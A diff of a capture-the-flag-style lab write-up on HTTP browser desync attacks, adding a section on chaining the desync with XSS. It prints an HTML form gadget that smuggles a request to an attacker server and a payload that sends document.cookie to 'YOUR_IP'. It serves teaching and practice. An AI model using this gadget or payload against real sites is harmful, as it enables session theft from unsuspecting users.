@@ -79,4 +79,27 @@ The following screenshots will show an example of the attack using the previous 
 The desync attack involves injecting an arbitrary request into the request HTTP queue. Upon refreshing the page, it redirects to the /redirect endpoint, leading to a 404 error page display since that route is not present.
 	![](Pasted%20image%2020250215051036.png)
 
-### Chaining XSS
+### XSS Chaining
+Based on the considerations outlined in previous tasks, one potential attack vector involves replacing the following request with an arbitrary JavaScript file to execute custom code.
+
+**Note:**
+	This strategy necessitates the presence of an arbitrary file upload feature on the website.
+
+Instead, we can use a rogue server to deliver an XSS attack to steal the cookie from the victim. We can use the following gadget and deliver it to abuse any component of the web application that allows to reflect text and probably be visited by a user:
+
+```html
+<form id="btn" action="http://challenge.thm/"
+    method="POST"
+    enctype="text/plain">
+<textarea name="GET http://YOUR_IP HTTP/1.1
+AAA: A">placeholder1</textarea>
+<button type="submit">placeholder2</button>
+</form>
+<script> btn.submit() </script>
+```
+
+We utilize a form because it inherently supports a keep-alive connection by default. The type is used to avoid the default encoding MIME type since we don't want to encode the second malicious request. Furthermore, the textarea's name attribute will overwrite the bytes of the following request, enabling redirection to our rogue server.  
+
+To summarize, this gadget operates by using the initial request to position the victim within the connection context of the vulnerable server. The following request retrieves the malicious payload, compromising the victim's session.
+
+To do so, we can set up a rogue server by serving a route with a malicious payload like: `fetch('http://YOUR_IP/' + document.cookie);`
